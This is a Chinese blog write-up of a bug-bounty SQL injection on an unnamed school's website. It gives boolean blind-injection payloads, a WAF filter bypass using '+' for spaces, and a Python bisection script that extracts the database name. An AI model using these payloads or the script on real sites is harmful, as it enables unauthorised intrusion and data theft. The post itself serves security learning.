# 原创
：  src实战纪实 | 某学校官网SQL注入漏洞

# src实战纪实 | 某学校官网SQL注入漏洞

在页面参数增加 and -1=-1，页面回显正常，这里如果 and 1=1 会被拦截：

---


然后尝试-1=-2，页面报错，此处可能存在数字型sql注入漏洞：

---


接下来就是查字段数 `order by 1` ,页面依旧报错:

如果大家在渗透的时候遇到这种情况,要考虑是不是某些参数被拦截等;

换一种思路，用盲注的思路走走看，不要到这里就直接放弃，觉得怎么现在还能存在数字型的注入漏洞这样，好歹能在edu赚点rank或者，换个证书。
1.  `and length(database()) &gt; 1` 
页面正常：
1.  `and length(database())&gt;10` 
页面报错：

这里是属于布尔盲注，接下来就是用2分法找到长度，最后测试结果是6，然后测试一下能不能爆库名字符：

---


然后再试试表名，如果表名字符也能出，这里数据也就能爆出来了，因为查表名的时候，表名就是从数据表中查询出来的结果：

---


这里经过多次尝试，确认了过滤的内容是：
1.  `from%20 # %20就是空格` 1.  `然后试着用%09,%0a,%0b,%0c等绕过都不可行` 
当我想要放弃的时候，一位学长跟我说用加号试试，我当时心里其实是非常不相信的，因为+在url编码里面就是空格的意思，那空格被过滤了，+不也就被禁掉了吗？

然后我出于礼貌的尝试了一下，发现成了！所以还是谦虚一点好：

---


这里至少没有被waf拦截，然后再继续尝试，这里的话把where语句去掉之后就可行了：

然后写一个脚本去跑，脚本这里的话网址都删掉了，可以看看编写思路：
1.  `这里用正则表达式，去看页面内容中是否存在`发布时间`这几个字符，存在的话就说明页面为True，不存在就是False；` 
然后用了二分法，二分法的话可以参考我的这篇文章：https://bbs.zkaq.cn/t/5506.html
1.  `# coding=gbk` 1.  `import requests` 1.  `import re` 1.  `def isTrue(url):` 1.  `res = requests.get(url)` 1.  `if re.search("发布时间", res.text):` 1.  `return True` 1.  `def get_length():` 1.  `for i in range(25):` 1.  `url = f"http://匿名?cate=5&amp;cid=1&amp;aid=972%20and%20length(database())={i}"` 1.  `if isTrue(url):` 1.  `print(f"length: {i}")` 1.  `return i` 1.  `def to_num1(url, num=1):` 1.  `# url &gt;` 1.  `if isTrue(url % num):` 1.  `return to_num1(url, num * 2)` 1.  `return [(num // 2) - 1, num]` 1.  `def tow_num2(url, num_):` 1.  `c = (num_[1] + num_[0]) / 2` 1.  `if isTrue(url % c): # 如果 大于 c成立 把最小值设置为中值` 1.  `# print(url % c)` 1.  `num_[0] = c` 1.  `else:` 1.  `num_[1] = c # 否则设置最大值` 1.  `if num_[1] - num_[0] &lt;= 1:` 1.  `num_[1] = round(num_[1])` 1.  `return num_[1]` 1.  `return tow_num2(url, [num_[0], num_[1]])` 1.  `def get_database():` 1.  `database_name = ''` 1.  `for i in range(1, get_length() + 1):` 1.  `url = f"http://匿名?cate=5&amp;cid=1&amp;aid=972 and ascii(substr(database(),{i},1))&gt;%d"` 1.  `num1 = to_num1(url)` 1.  `num2 = tow_num2(url,num1)` 1.  `database_name += chr(num2)` 1.  `print("database:" + database_name)` 1.  `if __name__ == '__main__':` 1.  `get_database()`  申明：本账号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法。 <h6>**免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/direct/2f74894cf8e04b7f87d9716681f6e26b.png" width="1024"/></h6> 渗透工具  技术文档、书籍 <img alt="" height="516" src="https://img-blog.csdnimg.cn/direct/5b4209eac3784bd18f5e1cd6a5157e4e.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/direct/4a89b0c2a52a4f569a970e55dcbac0b4.png" width="856"/>  面试题 帮助你在面试中脱颖而出  视频 基础到进阶 环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等 <img alt="" height="481" src="https://img-blog.csdnimg.cn/direct/4f211474c8ab4a5a910884e1d3423310.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/direct/54c2816350ae4bf787d1c6eec0d4e837.png" width="665"/>  应急响应笔记  学习路线  